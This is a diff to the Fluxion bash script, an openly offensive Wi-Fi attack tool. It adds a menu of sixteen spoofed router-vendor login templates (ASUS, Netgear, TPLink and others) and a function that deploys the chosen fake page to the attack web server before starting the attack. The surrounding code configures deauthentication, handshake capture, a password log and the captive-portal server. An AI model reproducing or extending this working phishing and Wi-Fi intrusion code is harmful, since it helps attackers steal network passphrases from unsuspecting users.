@@ -14,13 +14,15 @@ fi
 clear
 
 ##################################### < CONFIGURATION  > #####################################
+# Template directory
+SPECIFIC_WEB_PAGE="./Sites/Template"
 DUMP_PATH="/tmp/TMPflux"                               
 HANDSHAKE_PATH="/root/handshakes"
 PASSLOG_PATH="/root/pwlog"
 # Deauth duration during handshake capture
 DEAUTHTIME="20"
-revision=1
-version=0.19
+version=1.0
+revision=01
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
 
@@ -60,7 +62,14 @@ airmon
 # Check Updates 
 function checkupdatess {
 	
-	revision_online="$(timeout -s SIGTERM 20 curl -L "https://sites.google.com/site/deltaxflux/fluxion" 2>/dev/null| grep "^revision" | cut -d "=" -f2)"
+    version_online="$(timeout -s SIGTERM 20 curl -L --silent "https://raw.githubusercontent.com/DidyMond/fluxion/master/fluxion" 2>/dev/null | grep "^version" | cut -d "=" -f2)"
+    if [ -z "$version_online" ]; then
+		echo "?">$DUMP_PATH/Iver
+	else
+		echo "$version_online">$DUMP_PATH/Iver
+	fi
+    
+	revision_online="$(timeout -s SIGTERM 20 curl -L --silent "https://raw.githubusercontent.com/DidyMond/fluxion/master/fluxion" 2>/dev/null | grep "^revision" | cut -d "=" -f2)"
 	if [ -z "$revision_online" ]; then
 		echo "?">$DUMP_PATH/Irev
 	else
@@ -255,7 +264,7 @@ function mostrarheader(){
 	conditional_clear
 	echo -e "$blue#########################################################"
 	echo -e "$blue#                                                       #"
-  	echo -e "$blue#  $red    FLUXION $version" "${yellow} ${red}  < F""${yellow}luxion" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture >     "          ${blue}"  #" 
+  	echo -e "$blue#  $red    FLUXION $version" "${yellow} ${red}  < F""${yellow}luxion" "${red}I""${yellow}s" "${red}T""${yellow}he ""${red}F""${yellow}uture >     "          ${blue}"   #" 
 	echo -e "$blue#${yellow}       by "${red}D""${yellow}eltax", "${red}"S""${yellow}"trasharo and "${red}A""${yellow}patheticEuphoria"           "     ${blue}#"
 	echo -e "$blue#${yellow}                 "${red}M""${yellow}odded" by "${red}"D""${yellow}"idy"${red}M""${yellow}ond"                            "                   ${blue}#"	
 	echo -e "$blue#                                                       #"
@@ -512,12 +521,15 @@ if [ $FLUX_DEBUG != 1 ]; then
 	echo -e $green "           Master Project:"$red" https://github.com/deltaxflux/fluxion "$transparent
 	echo -e $green "           Forked Project:"$red" https://github.com/DidyMond/fluxion "$transparent
 	sleep 1
-	echo -n "                              Latest rev."
+	echo -n "                              Latest ver."
 	tput civis
 	checkupdatess &
 	spinner "$!"
+    version_online=$(cat $DUMP_PATH/Iver)
 	revision_online=$(cat $DUMP_PATH/Irev)
-	echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
+	echo -e ""$white" [${purple}${version_online}$white"$transparent"]"
+    echo -n "                              Latest rev."
+    echo -e ""$white" [${purple}${revision_online}$white"$transparent"]"
 #		if [ "$revision_online" != "?" ]; then
 #			
 #			if [ "$revision" != "$revision_online" ]; then
@@ -2401,42 +2413,44 @@ function webinterface {
 		echo
 		
 		echo -e "$blue""      1)"$transparent" Web Interface"
-		echo -e "$blue""      2)"$transparent" \e[1;31mExit"$transparent""
+        echo -e "$blue""      2)"$transparent" Template Web Interface"
+		echo -e "$blue""      3)"$transparent" \e[1;31mExit"$transparent""
 		
 		echo
 		echo -n "#? "
 		read yn
 		case $yn in
 		1 ) matartodo; Menu; break;;
-		2 ) matartodo; exitmode; break;;
+		2 ) matartodo; MenuTemplate; break;;
+        3 ) matartodo; exitmode; break;;
 		esac
 	done
 }
 
-		 function Menu {
-			while true; do
+function Menu {
+        while true; do
 
-				mostrarheader
-		
-				echo "Select Login Page"
-				echo "                                       "
-				      echo -e "$blue""      1)"$transparent" Connection Reset [RECOMMENDED]" 
-				      echo -e "$blue""      2)"$transparent" Login Pages"
-				      echo -e "$blue""      3)"$transparent" \e[1;31mExit"$transparent""
-					echo " "
-				echo -n '      #> '
-				read yn
-				case $yn in
-				1 ) matartodo; ConnectionRESET; selection; break;;
-				2 ) matartodo; LoginPages ;selection; break;;
-				3 ) matartodo; exitmode; break;;
-				* ) echo "Unknown option. Choose again"; conditional_clear ;;
-			esac
-		done
-	}
+            mostrarheader
+    
+            echo "Select Login Page"
+            echo "                                       "
+                  echo -e "$blue""      1)"$transparent" Connection Reset [RECOMMENDED]" 
+                  echo -e "$blue""      2)"$transparent" Login Pages"
+                  echo -e "$blue""      3)"$transparent" \e[1;31mExit"$transparent""
+                echo " "
+            echo -n '      #> '
+            read yn
+            case $yn in
+            1 ) matartodo; ConnectionRESET; selection; break;;
+            2 ) matartodo; LoginPages ;selection; break;;
+            3 ) matartodo; exitmode; break;;
+            * ) echo "Unknown option. Choose again"; conditional_clear ;;
+        esac
+    done
+}
 
 
-	function ConnectionRESET {
+function ConnectionRESET {
 
 		while true; do 
 			conditional_clear
@@ -2544,30 +2558,81 @@ function LoginPages {
 	
 	while true; do
 
-				mostrarheader
-		
-				echo "Select Login Page"
-				echo "                                       "
-				echo -e "$blue""      1)"$transparent" Login Page Netgear"
-				echo -e "$blue""      2)"$transparent" Login Page Verizon"
-				echo -e "$blue""      3)"$transparent" Login Page Xfinity"
-				echo -e "$blue""      4)"$transparent" General Login Page"
-				echo -e "$blue""      5)"$transparent" \e[1;31mExit"$transparent""
-				echo " "
-				echo -n '      #> '
-				read yn
-				case $yn in
-				1 ) matartodo; LoginNetgear; selection; break;;
-				2 ) matartodo; LoginVerizon ;selection; break;;
-				3 ) matartodo; LoginXfinity; selection; break;;
-				4 ) matartodo; LoginGeneral; selection; break;;
-				5 ) matartodo; exitmode; break;;
-				* ) echo "Unknown option. Choose again"; conditional_clear ;;
-			esac
-		done
+            mostrarheader
+    
+            infoap
+            echo "Select Login Page"
+            echo "                                       "
+            echo -e "$blue""      1)"$transparent" Login Page Netgear"
+            echo -e "$blue""      2)"$transparent" Login Page Verizon"
+            echo -e "$blue""      3)"$transparent" Login Page Xfinity"
+            echo -e "$blue""      4)"$transparent" General Login Page"
+            echo -e "$blue""      5)"$transparent" \e[1;31mExit"$transparent""
+            echo " "
+            echo -n '      #> '
+            read yn
+            case $yn in
+            1 ) matartodo; LoginNetgear; selection; break;;
+            2 ) matartodo; LoginVerizon ;selection; break;;
+            3 ) matartodo; LoginXfinity; selection; break;;
+            4 ) matartodo; LoginGeneral; selection; break;;
+            5 ) matartodo; exitmode; break;;
+            * ) echo "Unknown option. Choose again"; conditional_clear ;;
+        esac
+    done
+}
 
+function MenuTemplate {
+    while true; do
 
-
+        mostrarheader
+        
+        infoap
+        echo "Select Template Page"
+        echo "                                       "
+              echo -e "$blue""       1)"$transparent" Alice" 
+              echo -e "$blue""       2)"$transparent" ASUS"
+              echo -e "$blue""       3)"$transparent" Belkin"
+              echo -e "$blue""       4)"$transparent" Cisco"
+              echo -e "$blue""       5)"$transparent" Cisco_Lynksys"
+              echo -e "$blue""       6)"$transparent" Digicom"
+              echo -e "$blue""       7)"$transparent" Dlink"
+              echo -e "$blue""       8)"$transparent" FritzBox!"
+              echo -e "$blue""       9)"$transparent" Huawei"
+              echo -e "$blue""      10)"$transparent" Netgear"
+              echo -e "$blue""      11)"$transparent" Netis"
+              echo -e "$blue""      12)"$transparent" Sitecom"
+              echo -e "$blue""      13)"$transparent" Technicolor"
+              echo -e "$blue""      14)"$transparent" Telecom"
+              echo -e "$blue""      15)"$transparent" TPLink"
+              echo -e "$blue""      16)"$transparent" Zyxel"
+              
+              echo -e "$blue""      17)"$transparent" \e[1;31mExit"$transparent""
+            echo " "
+        echo -n '      #> '
+        read yn
+        case $yn in
+            1 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/alice"; template; selection; break;;
+            2 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/asus"; template; selection; break;;
+            3 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/belkin"; template; selection; break;;
+            4 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/cisco"; template; selection; break;;
+            5 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/cisco_lynksys"; template; selection; break;;
+            6 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/digicom"; template; selection; break;;
+            7 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/dlink"; template; selection; break;;
+            8 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/fritzbox"; template; selection; break;;
+            9 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/huawei"; template; selection; break;;
+            10 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/netgear"; template; selection; break;;
+            11 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/netis"; template; selection; break;;
+            12 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/sitecom"; template; selection; break;;
+            13 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/technicolor"; template; selection; break;;
+            14 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/telecom"; template; selection; break;;
+            15 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/tplink"; template; selection; break;;
+            16 ) matartodo; SPECIFIC_WEB_PAGE="$SPECIFIC_WEB_PAGE/zyxel"; template; selection; break;;
+            
+            17 ) matartodo; exitmode; break;;
+            * ) echo "Unknown option. Choose again"; conditional_clear ;;
+        esac
+    done
 }
 
 # Create different settings required for the script
@@ -2685,7 +2750,7 @@ server.modules = (
 
 fastcgi.server = ( \".php\" => ((
 		  \"bin-path\" => \"/usr/bin/php-cgi\",
-		  \"socket\" => \"/php.socket\"
+		  \"socket\" => \"/tmp/php.socket\"
 		)))
 
 server.port = 80
@@ -2706,7 +2771,7 @@ mimetype.assign = (
 server.error-handler-404 = \"/\"
 
 static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
-index-file.names = ( \"index.htm\" )
+index-file.names = ( \"index.html\", \"index.htm\", \"index.php\" )
 
 #Redirect www.domain.com to domain.com
 \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
@@ -3080,7 +3145,31 @@ function matartodo {
 
 
 
+####################################### < SPECIFIC WEB PAGE > #######################################
 
+function template {
+    
+	if [ ! -d $SPECIFIC_WEB_PAGE ]
+	then
+		echo -e "${red} Template not found! $rescolor"
+	else
+        if [ -d $DUMP_PATH/data ]
+        then
+            rm -r $DUMP_PATH/data/*
+        else
+            mkdir $DUMP_PATH/data
+        fi
+
+		cp -R $SPECIFIC_WEB_PAGE/* $DUMP_PATH/data
+
+		find $DUMP_PATH/data -type d -exec chmod 775 {} + 
+		find $DUMP_PATH/data -type f -exec chmod 664 {} +
+        
+        preattack
+        attack
+	fi
+
+}
 
 
 ######################################### < INTERFACE WEB > ########################################
